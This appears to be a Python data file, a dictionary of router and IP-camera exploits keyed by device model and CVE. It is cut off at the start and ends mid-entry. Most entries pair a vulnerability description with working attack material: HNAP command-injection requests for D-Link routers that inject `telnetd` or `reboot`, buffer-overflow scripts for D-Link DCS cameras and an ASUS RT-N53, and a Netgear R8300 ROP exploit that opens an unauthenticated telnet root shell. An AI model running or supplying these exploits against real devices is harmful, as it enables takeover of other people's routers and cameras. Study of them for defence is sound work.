["A Remote Command Execution (RCE) vulnerability exists in HNAP1/control/SetNetworkTomographySettings.php of D-Link Router DIR-846 DIR846A1_FW100A43.bin and DIR846enFW100A53DLA-Retail.bin because backticks can be used for command injection when judging whether it is a reasonable domain name.\n['https://github.com/doudoudedi/DIR-846_Command_Injection/blob/main/DIR-846_Command_Injection1.md', 'https://www.dlink.com/en/security-bulletin/']", '\n#affect A1version\nPOST /HNAP1/ HTTP/1.1\nHost: 192.168.0.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nSOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"\nHNAP_AUTH: B573700726C0DE33335368EFA98967D4 1640426452615\nContent-Length: 199\nOrigin: http://192.168.0.1\nConnection: close\nReferer: http://192.168.0.1/Diagnosis.html?t=1640426411756\nCookie: uid=yo1BBSdJ; PrivateKey=F307B0A38DD86259C01188B535369C5A; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=4\n\n{"SetNetworkTomographySettings":{"tomography_ping_address":"www.baidu.com/\'`reboot`\'","tomography_ping_number":"22","tomography_ping_size":"40","tomography_ping_timeout":"","tomography_ping_ttl":""}}\n        ']
}

model_exp_dic["DIR-822"] = {
    "CVE-2018-19986":
['In the /HNAP1/SetRouterSettings message, the RemotePort parameter is vulnerable, and the vulnerability affects D-Link DIR-818LW Rev.A 2.05.B03 and DIR-822 B1 202KRb06 devices. In the SetRouterSettings.php source code, the RemotePort parameter is saved in the $path_inf_wan1."/web" internal configuration memory without any regex checking. And in the IPTWAN_build_command function of the iptwan.php source code, the data in $path_inf_wan1."/web" is used with the iptables command without any regex checking. A vulnerable /HNAP1/SetRouterSettings XML message could have shell metacharacters in the RemotePort element such as the `telnetd` string.\n[\'https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990\']', '\n#POC XML data\n<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>\n<SetRouterSettings xmlns="http://purenetworks.com/HNAP1/">\n<ManageRemote>default</ManageRemote>\n<ManageWireless>default</ManageWireless>\n<RemoteSSL>default</RemoteSSL>\n<RemotePort>`telnetd`</RemotePort>\n<DomainName>default</DomainName>\n<WiredQoS>default</WiredQoS>\n</SetRouterSettings>\n</soap:Body> </soap:Envelope>\n'],
"CVE-2018-19987":
["D-Link DIR-822 Rev.B 202KRb06, DIR-822 Rev.C 3.10B06, DIR-860L Rev.B 2.03.B03, DIR-868L Rev.B 2.05B02, DIR-880L Rev.A 1.20B01_01_i3se_BETA, and DIR-890L Rev.A 1.21B02_BETA devices mishandle IsAccessPoint in /HNAP1/SetAccessPointMode. In the SetAccessPointMode.php source code, the IsAccessPoint parameter is saved in the ShellPath script file without any regex checking. After the script file is executed, the command injection occurs. A vulnerable /HNAP1/SetAccessPointMode XML message could have shell metacharacters in the IsAccessPoint element such as the `telnetd` string.\n['https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990']", '\n#POC XML\n#affect Firmware version: DIR-822_REVB - 202KRb06, DIR-822_REVC - 3.10B06, DIR-860L_REVB - 2.03.B03, DIR-868L_REVB - 2.05B02, DIR-880L_REVA - 1.20B01_01_i3se_BETA, DIR-890L_REVA - 1.21B02_BETA\n<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>\n<SetAccessPointMode xmlns="http://purenetworks.com/HNAP1/">\n<IsAccessPoint>`telnetd`</IsAccessPoint> </SetAccessPointMode>\n</soap:Body> </soap:Envelope>\n'],
"CVE-2018-19989":
["In the /HNAP1/SetQoSSettings message, the uplink parameter is vulnerable, and the vulnerability affects D-Link DIR-822 Rev.B 202KRb06 and DIR-822 Rev.C 3.10B06 devices. In the SetQoSSettings.php source code, the uplink parameter is saved in the /bwc/entry:1/bandwidth and /bwc/entry:2/bandwidth internal configuration memory without any regex checking. And in the bwc_tc_spq_start, bwc_tc_wfq_start, and bwc_tc_adb_start functions of the bwcsvcs.php source code, the data in /bwc/entry:1/bandwidth and /bwc/entry:2/bandwidth is used with the tc command without any regex checking. A vulnerable /HNAP1/SetQoSSettings XML message could have shell metacharacters in the uplink element such as the `telnetd` string.\n['https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990']", '\n#POC XML\n#affect Firmware version: DIR-822_REVB - 202KRb06, DIR-822_REVC - 3.10B06\n<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>\n<SetQoSSettings> <uplink>`telnetd`</uplink>\n<downlink>default</downlink>\n<QoSInfoData> <QoSInfo>\n<Hostname>hostname</Hostname>\n<IPAddress>192.168.0.1</IPAddress>\n<MACAddress>default</MACAddress>\n<Priority>default</Priority>\n<Type>default</Type>\n</QoSInfo> </QoSInfoData> </SetQoSSettings>\n</soap:Body> </soap:Envelope>\n'],
"CVE-2018-19990":
['In the /HNAP1/SetWiFiVerifyAlpha message, the WPSPIN parameter is vulnerable, and the vulnerability affects D-Link DIR-822 B1 202KRb06 devices. In the SetWiFiVerifyAlpha.php source code, the WPSPIN parameter is saved in the $rphyinf1."/media/wps/enrollee/pin" and $rphyinf2."/media/wps/enrollee/pin" and $rphyinf3."/media/wps/enrollee/pin" internal configuration memory without any regex checking. And in the do_wps function of the wps.php source code, the data in $rphyinf3."/media/wps/enrollee/pin" is used with the wpatalk command without any regex checking. A vulnerable /HNAP1/SetWiFiVerifyAlpha XML message could have shell metacharacters in the WPSPIN element such as the `telnetd` string.\n[\'https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990\']', '\n#POC XML\n#Firmware version: DIR822B1 - 202KRb06\n<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>\n<SetWiFiVerifyAlpha xmlns="http://purenetworks.com/HNAP1/" > <WPS>\n<DEV_PIN>default</DEV_PIN>\n<ResetToUnconfigured>default</ResetToUnconfigured>\n<WPSPBC>default</WPSPBC>\n<WPSPIN>`telnetd`</WPSPIN> </WPS>\n</SetWiFiVerifyAlpha>\n</soap:Body> </soap:Envelope>\n']
}

model_exp_dic["DIR-868L"] = {
    "CVE-2018-19988":
["In the /HNAP1/SetClientInfoDemo message, the AudioMute and AudioEnable parameters are vulnerable, and the vulnerabilities affect D-Link DIR-868L Rev.B 2.05B02 devices. In the SetClientInfoDemo.php source code, the AudioMute and AudioEnble parameters are saved in the ShellPath script file without any regex checking. After the script file is executed, the command injection occurs. It needs to bypass the wget command option with a single quote. A vulnerable /HNAP1/SetClientInfoDemo XML message could have single quotes and backquotes in the AudioMute or AudioEnable element, such as the '`telnetd`' string.\n['https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990']", '\n#POC XML\n#affect Firmware version: DIR-868L_REVB - 2.05B02\n<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>\n<SetClientInfoDemo> <ClientInfoLists> <ClientInfo>\n<MacAddress>11:22:33:44:55:66</MacAddress>\n<NickName>default</NickName>\n<ReserveIP>192.168.0.1</ReserveIP> <SupportedAction>\n<AudioMute>\'`telnetd`\'</AudioMute>\n<AudioEnable>default</AudioEnable>\n<SmartPlugEnable>default</SmartPlugEnable>\n<ZWaveSmartPlug>default</ZWaveSmartPlug> </SupportedAction>\n</ClientInfo> </ClientInfoLists>\n</SetClientInfoDemo>\n</soap:Body> </soap:Envelope>\n']
}

model_exp_dic["DCS-93xL"] = {
    "CVE-2019-10999":
["The D-Link DCS series of Wi-Fi cameras contains a stack-based buffer overflow in alphapd, the camera's web server. The overflow allows a remotely authenticated attacker to execute arbitrary code by providing a long string in the WEPEncryption parameter when requesting wireless.htm. Vulnerable devices include DCS-5009L (1.08.11 and below), DCS-5010L (1.14.09 and below), DCS-5020L (1.15.12 and below), DCS-5025L (1.03.07 and below), DCS-5030L (1.04.10 and below), DCS-930L (2.16.01 and below), DCS-931L (1.14.11 and below), DCS-932L (2.17.01 and below), DCS-933L (1.14.11 and below), and DCS-934L (1.05.04 and below).\n['https://github.com/fuzzywalls/CVE-2019-10999']", "\n#!/usr/bin/python3\n\nimport sys\nimport argparse\nimport requests\nimport importlib\n\nfrom DlinkExploit import version\nfrom DlinkExploit import util\n\n\ndef exploit_target(target_ip, target_port, command, username, password):\n    '''\n    Perform target exploitation.\n    :param target_ip: IP address of the target.\n    :type target_ip: str\n    :param target_port: Listening port of alphapd.\n    :type target_port: str\n    :param command: Command to execute on the target after exploitation is\n                    complete.\n    :type command: str\n    :param username: Username for HTTP authentication.\n    :type username: str\n    :param password: Password for HTTP authentication.\n    :type password: str\n    '''\n    if username is None or password is None:\n        print('Username and password are required for exploitation.')\n        sys.exit(-1)\n\n    # Must have a value in the referer field of the HTTP header or a request\n    # Forbidden is returned. Doesn't seem to like if port 80 is in the referer\n    # field so handle it differently here.\n    if target_port == '80':\n        url = 'http://%s/wireless.htm' % target_ip\n        referer = 'http://%s/wizard.htm' % target_ip\n    else:\n        url = 'http://%s:%s/wireless.htm' % (target_ip, target_port)\n        referer = 'http://%s:%s/wizard.htm' % (target_ip, target_port)\n\n    try:\n        camera_version = version.get_camera_version(target_ip, target_port)\n    except:\n        sys.exit(-1)\n\n    print('%s' % camera_version)\n\n    # This might get tedious if the models aren't consistent, but its pretty\n    # simple for now.\n    try:\n        target_camera = 'DlinkExploit.overflows.%s' % camera_version.model\n        camera_overflow = importlib.import_module(target_camera)\n    except ModuleNotFoundError:\n        print('Target model, (%s), not found.' % camera_version.model)\n        sys.exit(-1)\n\n    camera_overflow = camera_overflow.Overflow()\n    url = url + camera_overflow.generate(camera_version, command)\n\n    print('URL: %s' % url)\n\n    auth = util.create_http_auth(target_ip, target_port, username, password)\n    if auth is None:\n        print('Invalid authentication type. Neither basic or digest are '\n              'supported.')\n        sys.exit(-1)\n\n    try:\n        r = requests.get(url, auth=auth, headers={'Referer': referer})\n        print('Status: %s' % r.status_code)\n    except:\n        pass\n\n\nif __name__ == '__main__':\n\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument('-i', '--ip', help='Target IP address.')\n    parser.add_argument('-P', '--port', help='Target Port.', default='80')\n    parser.add_argument('-c', '--command', default='telnetd -p 5555 -l /bin/sh',\n                        help='Command to execute after exploitation.')\n    parser.add_argument('-u', '--user', help='Username for authentication',\n                        default='admin')\n    parser.add_argument('-p', '--password', help='Password for authentication.',\n                        default='')\n\n    args = parser.parse_args()\n\n    exploit_target(args.ip, args.port, args.command, args.user, args.password)\n"]
}

model_exp_dic["RT-N53"] = {
    "CVE-2019-20082":
   ["ASUS RT-N53 3.0.0.4.376.3754 devices have a buffer overflow via a long lan_dns1_x or lan_dns2_x parameter to Advanced_LAN_Content.asp.\n['https://github.com/pr0v3rbs/CVE/tree/master/CVE-2019-20082', 'https://www.asus.com']", ' \n#!/usr/bin/env python3\n\nimport requests\n\nIP = input(\'Target IP:\').strip()\n\nreq = requests\n\nheaders = requests.utils.default_headers()\nheaders["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"\nheaders["Referer"] = "http://" + IP + "/"\n\nbuf = \'a\'*128\npayload = {\'productid\': \'RT-N53\', \'current_page\': \'Advanced_LAN_Content.asp\', \'next_page\': \'\', \'group_id\': \'\', \'modified\': \'0\', \'action_mode\': \'apply_new\', \'action_script\': \'restart_net_and_phy\', \'action_wait\': \'35\', \'preferred_lang\': \'EN\', \'firmver\': \'3.0.0.4\', \'wan_ipaddr_x\': \'\', \'wan_netmask_x\': \'\', \'wan_proto\': \'dhcp\', \'lan_proto\': \'static\', \'lan_dnsenable_x\': \'0\', \'lan_ipaddr_rt\': \'192.168.1.1\', \'lan_netmask_rt\': \'255.255.255.0\', \'lan_proto_radio\': \'static\', \'lan_ipaddr\': \'192.168.1.1\', \'lan_netmask\': \'255.255.255.0\', \'dhcp_start\': \'192.168.1.2\', \'dhcp_end\': \'192.168.1.254\', \'lan_gateway\': \'0.0.0.0\', \'lan_dnsenable_x_radio\': \'0\', \'lan_dns1_x\': buf, \'lan_dns2_x\':\'\'}\n\nreq.post(\'http://{}/start_apply.htm\'.format(IP), headers=headers, data=payload, timeout=10)\nprint(\'sent buffer overflow packet\')\n        ']
}

model_exp_dic["Netgear_R8300"] = {
    "PSV-2020-0211":
["Security Advisory for Pre-Authentication Command Injection on R8300, PSV-2020-0211", '\nimport socket\nimport time\nimport sys\nfrom struct import pack\n# NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130\n# Date : 2020.03.09\n# POC : system("telnetd -l /bin/sh -p 9999& ") Execute\n# Desc : execute telnetd to access router\n# by python2\np32 = lambda x: pack("<L", x)\npayload = \'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7ABBBc9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7DDDBa9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7 AAA Aa9CbEEEECb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F\'\nexpayload = \'\'\npayload = payload.replace(\'z3Bz\',\'\\xff\\xff\\x1b\\x40\') # Need to Existed Address\npayload = payload.replace(\' AAA \',\'\\xf0\\x30\\x02\\x00\') #change eip\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nbssBase = 0x9E150   #string bss BASE Address\nexpayload += \'a\' * 4550\nexpayload += p32(bssBase+3) # R4 Register\nexpayload += p32(0x3F340) # R5 Register //tel\nexpayload += \'IIII\' # R6 Register\nexpayload += \'HHHH\' # R7 Register\nexpayload += \'GGGG\' # R8 Register\nexpayload += \'FFFF\' # R9 Register\nexpayload += p32(bssBase) # R10 Register\nexpayload += \'BBBB\' # R11 Register\nexpayload += p32(0x13644) # strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+6) #R4\nexpayload += p32(0x423D7) #R5  //telnet\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+8) #R4\nexpayload += p32(0x40CA4 ) #R5  //telnetd\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+10) #R4\nexpayload += p32(0x4704A) #R5  //telnetd\\x20-l\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+11) #R4\nexpayload += p32(0x04C281) #R5  //telnetd\\x20-l/bin/\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+16) #R4\nexpayload += p32(0x40CEC) #R5  //telnetd\\x20-l/bin/\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+18) #R4\nexpayload += p32(0x9CB5) #R5  //telnetd\\x20-l/bin/sh\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+22) #R4\nexpayload += p32(0x41B17) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+24) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x2099\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+26) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+28) #R4\nexpayload += p32(0x4A01D) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+30) #R4\nexpayload += p32(0x461C1) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\\x20\\x00\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nprint "[*] Make Payload ..."\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase) #R4\nexpayload += p32(0x47398) #R5\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x1A83C) #system(string) telnetd -l\ns.connect((\'239.255.255.250\', 1900))\nprint "[*] Send Proof Of Concept payload"\ns.send(\'a\\x00\'+expayload)#expayload is rop gadget\ns.send(payload)\ndef checkExploit():\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntry:\n    ret = soc.connect((\'192.168.1.1\',9999))\n    return 1\nexcept:\n    return 0\ntime.sleep(5)\nif checkExploit():\n    print "[*] Exploit Success"\n    print "[*] You can access telnet 192.168.1.1 9999"\nelse:\n    print "[*] Need to Existed Address cross each other"\n    print "[*] You need to reboot or execute upnpd daemon to execute upnpd"\n    print "[*] To exploit reexecute upnpd, description"\n    print "[*] Access http://192.168.1.1/debug.htm and enable telnet"\n    print "[*] then, You can access telnet. execute upnpd(just typing upnpd)"\ns.close()\nprint(Done)\n        ']
}

model_exp_dic["H3C_magic_R100"] = {
    "stack_overflow":["stackoverflow auth",
"""
POST /goform/aspForm HTTP/1.1
Host: 192.168.0.1
